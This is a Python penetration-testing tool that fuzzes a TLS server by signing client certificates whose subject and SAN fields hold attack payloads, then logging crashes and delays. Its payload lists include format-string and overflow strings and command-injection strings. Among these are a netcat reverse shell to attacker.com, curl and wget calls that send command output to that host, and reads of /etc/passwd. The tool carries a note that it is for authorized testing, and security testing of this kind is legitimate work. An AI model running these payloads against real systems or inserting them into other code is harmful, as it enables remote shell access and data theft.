#!/usr/bin/env python3
"""
TLS Certificate Fuzzer for Authorized Penetration Testing
Tests server handling of malformed certificates for vulnerabilities
"""

import ssl
import socket
import os
import random
import string
import struct
import time
import argparse
import json
from datetime import datetime, timedelta
from cryptography import x509
from cryptography.x509.oid import NameOID, ExtensionOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
from typing import List, Dict, Any, Optional
import threading
import queue

class CertificateFuzzer:
    """Fuzzer for testing TLS certificate handling vulnerabilities"""
    
    def __init__(self, target_host: str, target_port: int, 
                 client_cert: Optional[str] = None,
                 client_key: Optional[str] = None,
                 ca_cert: Optional[str] = None,
                 verbose: bool = False):
        self.target_host = target_host
        self.target_port = target_port
        self.client_cert_path = client_cert
        self.client_key_path = client_key
        self.ca_cert_path = ca_cert
        self.verbose = verbose
        self.results = []
        self.test_count = 0
        
        # Load base certificate if provided
        self.base_cert = None
        self.base_key = None
        if client_cert and client_key:
            self.load_base_certificate()
        
        # Format string payloads
        self.format_string_payloads = [
            "%s%s%s%s%s",
            "%p%p%p%p%p",
            "%x%x%x%x%x",
            "%d%d%d%d%d",
            "%n%n%n%n%n",
            "%.1024x%.1024x%.1024x%.1024x",
            "%s"*100,
            "%p"*100,
            "%.2048x%n",
            "%.4096x%p",
            "%*d%n",
            "%*s%n",
            "%%%%%%%%%%",
            "%c%c%c%c%c%c%c%c%c%c",
            "%lx%lx%lx%lx",
            "%hn%hn%hn%hn",
            "%hhn%hhn%hhn%hhn",
            "%ln%ln%ln%ln",
            "%lln%lln%lln%lln",
            "AAAA%p%p%p%p%p%p",
            "\x00%p%p%p%p",
        ]
        
        # Command injection payloads
        self.command_injection_payloads = [
            "; ls -la",
            "| id",
            "& whoami",
            "\n/bin/sh",
            "`id`",
            "$(whoami)",
            "; cat /etc/passwd",
            "| nc attacker.com 4444 -e /bin/sh",
            "\"; ls #",
            "'; ls #",
            "|| ping -c 1 127.0.0.1",
            "&& sleep 10",
            "; curl http://attacker.com/$(whoami)",
            "| wget http://attacker.com/`id`",
            "\x00; ls",
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "%0a/bin/cat%20/etc/passwd",
            "%0d%0a/bin/ls",
            "\r\nls\r\n",
            "${IFS}cat${IFS}/etc/passwd",
            "{echo,test}",
            "test;echo${IFS}test",
            "test$(echo${IFS}test)",
            "test`echo${IFS}test`",
        ]
        
        # Mixed encoding payloads
        self.encoding_payloads = [
            "\x00\x00\x00\x00",
            "\xff\xff\xff\xff",
            "\x7f\x7f\x7f\x7f",
            "\x80\x80\x80\x80",
            "A" * 1024,
            "A" * 4096,
            "A" * 65536,
            "\x00A\x00B\x00C",
            "\\x00\\x00\\x00",
            "%00%00%00%00",
            "\r\n\r\n\r\n",
            "\n\r\n\r\n\r",
        ]
        
    def load_base_certificate(self):
        """Load the valid client certificate and key to use as base"""
        try:
            # Load the certificate
            with open(self.client_cert_path, "rb") as f:
                cert_data = f.read()
                self.base_cert = x509.load_pem_x509_certificate(cert_data, default_backend())
            
            # Load the private key (handles RSA, EC, ECDSA formats)
            with open(self.client_key_path, "rb") as f:
                key_data = f.read()
            
            # Check if it's an ECDSA key format (needs conversion)
            if b'BEGIN ECDSA PRIVATE KEY' in key_data:
                # Replace ECDSA headers with EC headers for compatibility
                key_data = key_data.replace(b'BEGIN ECDSA PRIVATE KEY', b'BEGIN EC PRIVATE KEY')
                key_data = key_data.replace(b'END ECDSA PRIVATE KEY', b'END EC PRIVATE KEY')
            
            # Try to load the private key
            try:
                self.base_key = serialization.load_pem_private_key(
                    key_data, password=None, backend=default_backend()
                )
            except TypeError:
                # Key might be encrypted, prompt for password
                import getpass
                password = getpass.getpass("Enter password for client key: ").encode()
                self.base_key = serialization.load_pem_private_key(
                    key_data, password=password, backend=default_backend()
                )
            except ValueError as e:
                # If still failing, provide more detailed error
                if 'Could not deserialize' in str(e):
                    print(f"[!] Failed to load private key. Detected headers in file:")
                    if b'BEGIN PRIVATE KEY' in key_data:
                        print("    - Found: BEGIN PRIVATE KEY")
                    if b'BEGIN RSA PRIVATE KEY' in key_data:
                        print("    - Found: BEGIN RSA PRIVATE KEY")
                    if b'BEGIN EC PRIVATE KEY' in key_data:
                        print("    - Found: BEGIN EC PRIVATE KEY")
                    if b'BEGIN ENCRYPTED PRIVATE KEY' in key_data:
                        print("    - Found: BEGIN ENCRYPTED PRIVATE KEY")
                raise
            
            # Verify the key matches the certificate
            try:
                cert_pubkey = self.base_cert.public_key()
                key_pubkey = self.base_key.public_key()
                
                # Serialize both public keys to compare them
                cert_pub_pem = cert_pubkey.public_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PublicFormat.SubjectPublicKeyInfo
                )
                key_pub_pem = key_pubkey.public_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PublicFormat.SubjectPublicKeyInfo
                )
                
                if cert_pub_pem != key_pub_pem:
                    print("[!] Warning: Private key does not match the certificate!")
            except:
                pass  # Skip verification if it fails
            
            print(f"[+] Loaded base certificate: CN={self.base_cert.subject.get_attributes_for_oid(NameOID.COMMON_NAME)[0].value}")
            
        except Exception as e:
            print(f"[!] Error loading base certificate: {str(e)}")
            raise
    
    def test_valid_certificate(self) -> bool:
        """Test that the valid certificate works before fuzzing"""
        if not self.base_cert or not self.base_key:
            print("[!] No base certificate loaded")
            return False
            
        print("[*] Testing valid certificate first...")
        result = self.test_certificate(self.base_cert, self.base_key, "valid_baseline", "original")
        
        if result["success"] or "alert" not in str(result.get("error", "")).lower():
            print("[+] Valid certificate accepted by server")
            return True
        else:
            print(f"[!] Valid certificate rejected: {result['error']}")
            return False
        
    def generate_base_certificate(self) -> tuple:
        """Generate a base certificate and private key"""
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
        )
        
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "Test"),
            x509.NameAttribute(NameOID.LOCALITY_NAME, "Test"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Fuzzer"),
            x509.NameAttribute(NameOID.COMMON_NAME, "test.local"),
        ])
        
        cert = x509.CertificateBuilder().subject_name(
            subject
        ).issuer_name(
            issuer
        ).public_key(
            private_key.public_key()
        ).serial_number(
            x509.random_serial_number()
        ).not_valid_before(
            datetime.utcnow()
        ).not_valid_after(
            datetime.utcnow() + timedelta(days=365)
        ).sign(private_key, hashes.SHA256(), default_backend())
        
        return cert, private_key
    
    def mutate_certificate_field(self, cert: x509.Certificate, private_key, 
                                field_type: str, payload: str) -> x509.Certificate:
        """Mutate a specific field in the certificate while preserving other fields"""
        builder = x509.CertificateBuilder()
        
        # Copy basic fields from original certificate, but generate new serial number
        builder = builder.public_key(cert.public_key())
        builder = builder.serial_number(x509.random_serial_number())
        builder = builder.not_valid_before(cert.not_valid_before)
        builder = builder.not_valid_after(cert.not_valid_after)
        
        # Preserve existing extensions except the one we're mutating
        for ext in cert.extensions:
            if field_type != "san" or not isinstance(ext.value, x509.SubjectAlternativeName):
                try:
                    builder = builder.add_extension(ext.value, ext.critical)
                except:
                    pass  # Skip if extension can't be added
        
        # Mutate specific field based on type
        if field_type == "common_name":
            # Build subject with mutated CN but preserve other attributes
            attributes = []
            for attribute in cert.subject:
                if attribute.oid == NameOID.COMMON_NAME:
                    attributes.append(x509.NameAttribute(NameOID.COMMON_NAME, payload))
                else:
                    attributes.append(attribute)
            
            # If CN wasn't in original, add it
            if not any(attr.oid == NameOID.COMMON_NAME for attr in attributes):
                attributes.append(x509.NameAttribute(NameOID.COMMON_NAME, payload))
            
            subject = x509.Name(attributes)
            builder = builder.subject_name(subject)
            builder = builder.issuer_name(cert.issuer)
            
        elif field_type == "organization":
            # Build subject with mutated O but preserve other attributes
            attributes = []
            for attribute in cert.subject:
                if attribute.oid == NameOID.ORGANIZATION_NAME:
                    attributes.append(x509.NameAttribute(NameOID.ORGANIZATION_NAME, payload))
                else:
                    attributes.append(attribute)
            
            # If O wasn't in original, add it
            if not any(attr.oid == NameOID.ORGANIZATION_NAME for attr in attributes):
                attributes.append(x509.NameAttribute(NameOID.ORGANIZATION_NAME, payload))
            
            subject = x509.Name(attributes)
            builder = builder.subject_name(subject)
            builder = builder.issuer_name(cert.issuer)
            
        elif field_type == "email":
            # Build subject with mutated email but preserve other attributes
            attributes = []
            for attribute in cert.subject:
                if attribute.oid == NameOID.EMAIL_ADDRESS:
                    attributes.append(x509.NameAttribute(NameOID.EMAIL_ADDRESS, payload))
                else:
                    attributes.append(attribute)
            
            # If email wasn't in original, add it
            if not any(attr.oid == NameOID.EMAIL_ADDRESS for attr in attributes):
                attributes.append(x509.NameAttribute(NameOID.EMAIL_ADDRESS, payload))
            
            subject = x509.Name(attributes)
            builder = builder.subject_name(subject)
            builder = builder.issuer_name(cert.issuer)
            
        elif field_type == "san":
            builder = builder.subject_name(cert.subject)
            builder = builder.issuer_name(cert.issuer)
            # Add SAN extension with payload
            try:
                builder = builder.add_extension(
                    x509.SubjectAlternativeName([
                        x509.DNSName(payload),
                    ]),
                    critical=False,
                )
            except:
                # If payload is invalid for DNS, try as URI
                try:
                    builder = builder.add_extension(
                        x509.SubjectAlternativeName([
                            x509.UniformResourceIdentifier("http://" + payload),
                        ]),
                        critical=False,
                    )
                except:
                    pass
        else:
            builder = builder.subject_name(cert.subject)
            builder = builder.issuer_name(cert.issuer)
        
        # Sign the mutated certificate
        mutated_cert = builder.sign(private_key, hashes.SHA256(), default_backend())
        return mutated_cert
    
    def test_certificate(self, cert: x509.Certificate, private_key, 
                        test_name: str, payload: str) -> Dict[str, Any]:
        """Test a single certificate against the target"""
        result = {
            "test_name": test_name,
            "payload": payload[:100],  # Truncate long payloads
            "timestamp": datetime.utcnow().isoformat(),
            "success": False,
            "error": None,
            "response_time": None,
            "connection_closed": False
        }
        
        try:
            # Create SSL context with the mutated certificate
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            # Load CA cert if provided for server verification
            if self.ca_cert_path:
                context.load_verify_locations(self.ca_cert_path)
                context.verify_mode = ssl.CERT_REQUIRED
            
            # Create temporary cert and key files
            cert_file = f"/tmp/fuzz_cert_{self.test_count}.pem"
            key_file = f"/tmp/fuzz_key_{self.test_count}.pem"
            
            with open(cert_file, "wb") as f:
                f.write(cert.public_bytes(serialization.Encoding.PEM))
            
            with open(key_file, "wb") as f:
                f.write(private_key.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.TraditionalOpenSSL,
                    encryption_algorithm=serialization.NoEncryption()
                ))
            
            context.load_cert_chain(cert_file, key_file)
            
            # Attempt connection
            start_time = time.time()
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(5)
                with context.wrap_socket(sock, server_hostname=self.target_host) as ssock:
                    ssock.connect((self.target_host, self.target_port))
                    result["response_time"] = time.time() - start_time
                    result["success"] = True
                    
                    # Try to read response
                    try:
                        data = ssock.recv(1024)
                        if data:
                            result["response_data"] = data[:100].hex()
                    except:
                        pass
                    
        except ssl.SSLError as e:
            result["error"] = f"SSL Error: {str(e)}"
            result["connection_closed"] = "closed" in str(e).lower()
        except socket.timeout:
            result["error"] = "Connection timeout"
            result["response_time"] = 5.0
        except ConnectionRefusedError:
            result["error"] = "Connection refused"
            result["connection_closed"] = True
        except Exception as e:
            result["error"] = f"Error: {str(e)}"
        finally:
            # Clean up temp files
            try:
                if 'cert_file' in locals():
                    os.remove(cert_file)
                if 'key_file' in locals():
                    os.remove(key_file)
            except:
                pass
        
        return result
    
    def fuzz_certificates(self):
        """Main fuzzing loop"""
        print(f"[*] Starting TLS certificate fuzzing against {self.target_host}:{self.target_port}")
        print(f"[*] Total payload types: Format strings: {len(self.format_string_payloads)}, Command injection: {len(self.command_injection_payloads)}, Encoding: {len(self.encoding_payloads)}")
        
        # Test the valid certificate first if available
        if self.base_cert and self.base_key:
            print("[*] Base certificate and key loaded successfully")
            if not self.test_valid_certificate():
                print("[!] Warning: Base certificate may not be valid. Continuing anyway...")
        else:
            print("[*] No base certificate loaded, will generate certificates for each test")
        
        fields_to_fuzz = ["common_name", "organization", "email", "san"]
        print(f"[*] Fields to fuzz: {', '.join(fields_to_fuzz)}")
        
        # Test format string payloads
        print(f"\n[*] Testing {len(self.format_string_payloads)} format string payloads...")
        for i, payload in enumerate(self.format_string_payloads):
            if i == 0:
                print(f"  [*] Starting format string tests...")
            for field in fields_to_fuzz:
                self.test_count += 1
                
                # Use loaded certificate or generate one
                if self.base_cert and self.base_key:
                    base_cert, private_key = self.base_cert, self.base_key
                else:
                    base_cert, private_key = self.generate_base_certificate()
                
                try:
                    mutated_cert = self.mutate_certificate_field(base_cert, private_key, field, payload)
                    result = self.test_certificate(mutated_cert, private_key, 
                                                 f"format_string_{field}", payload)
                    self.results.append(result)
                    
                    if self.verbose or self.test_count == 1:
                        print(f"  [{self.test_count}] {field}: {payload[:30]}... - {result['error'] or 'Success'}")
                    
                    # Check for interesting results
                    if result["connection_closed"] or (result["error"] and "bad" not in result["error"].lower()):
                        print(f"  [!] Interesting result for {field} with payload: {payload[:50]}")
                        print(f"      Error: {result['error']}")
                        
                except Exception as e:
                    if self.verbose or self.test_count == 1:
                        print(f"  [x] Failed to mutate {field}: {str(e)}")
        
        # Test command injection payloads
        print("\n[*] Testing command injection payloads...")
        for payload in self.command_injection_payloads:
            for field in fields_to_fuzz:
                self.test_count += 1
                
                # Use loaded certificate or generate one
                if self.base_cert and self.base_key:
                    base_cert, private_key = self.base_cert, self.base_key
                else:
                    base_cert, private_key = self.generate_base_certificate()
                
                try:
                    mutated_cert = self.mutate_certificate_field(base_cert, private_key, field, payload)
                    result = self.test_certificate(mutated_cert, private_key, 
                                                 f"cmd_injection_{field}", payload)
                    self.results.append(result)
                    
                    if self.verbose:
                        print(f"  [{self.test_count}] {field}: {payload[:30]}... - {result['error'] or 'Success'}")
                    
                    # Check for delays (potential command execution)
                    if result["response_time"] and result["response_time"] > 3:
                        print(f"  [!] Slow response for {field} with payload: {payload[:50]}")
                        print(f"      Response time: {result['response_time']:.2f}s")
                        
                except Exception as e:
                    if self.verbose:
                        print(f"  [x] Failed to mutate {field}: {str(e)}")
        
        # Test encoding/overflow payloads
        print("\n[*] Testing encoding and overflow payloads...")
        for payload in self.encoding_payloads:
            for field in fields_to_fuzz:
                self.test_count += 1
                
                # Use loaded certificate or generate one
                if self.base_cert and self.base_key:
                    base_cert, private_key = self.base_cert, self.base_key
                else:
                    base_cert, private_key = self.generate_base_certificate()
                
                try:
                    mutated_cert = self.mutate_certificate_field(base_cert, private_key, field, payload)
                    result = self.test_certificate(mutated_cert, private_key, 
                                                 f"encoding_{field}", payload)
                    self.results.append(result)
                    
                    if self.verbose:
                        print(f"  [{self.test_count}] {field}: {repr(payload[:30])}... - {result['error'] or 'Success'}")
                    
                    if result["connection_closed"]:
                        print(f"  [!] Connection closed for {field} with payload: {repr(payload[:50])}")
                        
                except Exception as e:
                    if self.verbose:
                        print(f"  [x] Failed to mutate {field}: {str(e)}")
    
    def generate_report(self, output_file: str = "fuzzing_report.json"):
        """Generate a report of fuzzing results"""
        print(f"\n[*] Generating report...")
        
        # Analyze results
        total_tests = len(self.results)
        successful_connections = sum(1 for r in self.results if r["success"])
        connection_closed = sum(1 for r in self.results if r["connection_closed"])
        slow_responses = sum(1 for r in self.results if r["response_time"] and r["response_time"] > 3)
        
        report = {
            "target": f"{self.target_host}:{self.target_port}",
            "timestamp": datetime.utcnow().isoformat(),
            "summary": {
                "total_tests": total_tests,
                "successful_connections": successful_connections,
                "connection_closed": connection_closed,
                "slow_responses": slow_responses
            },
            "interesting_results": [],
            "all_results": self.results
        }
        
        # Find interesting results
        for result in self.results:
            if (result["connection_closed"] or 
                (result["response_time"] and result["response_time"] > 3) or
                (result["error"] and "bad" not in result["error"].lower() and "wrong" not in result["error"].lower())):
                report["interesting_results"].append(result)
        
        # Save report
        with open(output_file, "w") as f:
            json.dump(report, f, indent=2)
        
        print(f"[+] Report saved to {output_file}")
        print(f"\n[*] Summary:")
        print(f"    Total tests: {total_tests}")
        print(f"    Successful connections: {successful_connections}")
        print(f"    Connections closed: {connection_closed}")
        print(f"    Slow responses (>3s): {slow_responses}")
        print(f"    Interesting results: {len(report['interesting_results'])}")
        
        if report["interesting_results"]:
            print(f"\n[!] Interesting results found:")
            for result in report["interesting_results"][:10]:  # Show first 10
                print(f"    - {result['test_name']}: {result['payload'][:50]}...")
                if result["error"]:
                    print(f"      Error: {result['error']}")
                if result["response_time"] and result["response_time"] > 3:
                    print(f"      Response time: {result['response_time']:.2f}s")


def main():
    parser = argparse.ArgumentParser(description="TLS Certificate Fuzzer for Penetration Testing")
    parser.add_argument("host", help="Target host")
    parser.add_argument("port", type=int, help="Target port")
    parser.add_argument("-c", "--client-cert", help="Path to valid client certificate (PEM)")
    parser.add_argument("-k", "--client-key", help="Path to client certificate private key (PEM)")
    parser.add_argument("--ca-cert", help="Path to CA certificate for server verification (PEM)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument("-o", "--output", default="fuzzing_report.json", help="Output report file")
    parser.add_argument("--timeout", type=int, default=5, help="Connection timeout in seconds")
    
    args = parser.parse_args()
    
    # Validate cert/key arguments
    if (args.client_cert and not args.client_key) or (args.client_key and not args.client_cert):
        print("[!] Error: Both --client-cert and --client-key must be provided together")
        return
    
    print("""
╔══════════════════════════════════════════════════════════════╗
║             TLS Certificate Fuzzer - PenTest Tool            ║
║                  FOR AUTHORIZED TESTING ONLY                 ║
╚══════════════════════════════════════════════════════════════╝
""")
    
    fuzzer = CertificateFuzzer(
        args.host, 
        args.port, 
        client_cert=args.client_cert,
        client_key=args.client_key,
        ca_cert=args.ca_cert,
        verbose=args.verbose
    )
    
    try:
        fuzzer.fuzz_certificates()
        fuzzer.generate_report(args.output)
    except KeyboardInterrupt:
        print("\n[!] Fuzzing interrupted by user")
        if fuzzer.results:  # Only generate report if we have results
            fuzzer.generate_report(args.output)
    except Exception as e:
        print(f"\n[!] Error during fuzzing: {str(e)}")
        import traceback
        traceback.print_exc()
        if fuzzer.results:  # Only generate report if we have results
            fuzzer.generate_report(args.output)


if __name__ == "__main__":
    main()